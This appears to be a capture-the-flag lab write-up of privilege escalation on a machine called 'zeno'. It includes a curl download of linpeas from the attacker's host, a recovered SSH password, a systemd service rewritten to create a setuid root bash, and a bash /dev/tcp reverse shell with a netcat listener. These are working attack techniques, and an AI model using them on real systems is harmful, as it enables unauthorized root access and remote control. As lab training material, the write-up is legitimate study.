Privilege Escalation


I looked under all the files and folders and found /var/www/html/rms/conecction/config.php but it did not work as a password for ssh connection for edward.


Then, the linpeas.sh file was downloaded into the /tmp folder. Since wget was not working, it was downloaded using curl.

Command >> curl <http://your_ip>/linpeas.sh -o linpeas.sh


The following result was captured:

password >> FrobjoodAdkoonceanJa



I tried to log in to the system as Edward user via SSH and entered by giving the password and caught the user.txt flag.

>> ssh edward@<server_ip> -p 22


I ran the sudo -l command to elevate privileges and
I saw that the (ALL) /usr/sbin/reboot command was run with sudo privileges.

Priv ESc Step::

linpeas found write permission >>> /etc/systemd/system/zeno-monitoring.service script. 



echo -e "[unit]\nDescription=Zeno monitoring\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash_root; chmod +xs /home/edward/bash_root'\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/zeno-monitoring.service
[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service[unit]
Description=Zeno monitoring

[Service]
Type=simple

[edward@zeno ~]$ sudo /usr/sbin/reboot


There is a code example above that will increase our privileges. You can also do this with a reverse shell. When restarting, you can listen with netcat and listen on a certain port and access root privileges.

EXam >>> bash -i >& /dev/tcp/<your_ip>/9002 0>&1

nc -nlvp 9002

>>>>>Get SHell<<<<<<<


When we connect via ssh again after 1-2 minutes, we see that our bash_root file is here.

[edward@zeno ~]$ ./bash_root -p   >> -p represents privileged mode


WE ARE ROOT!!!!
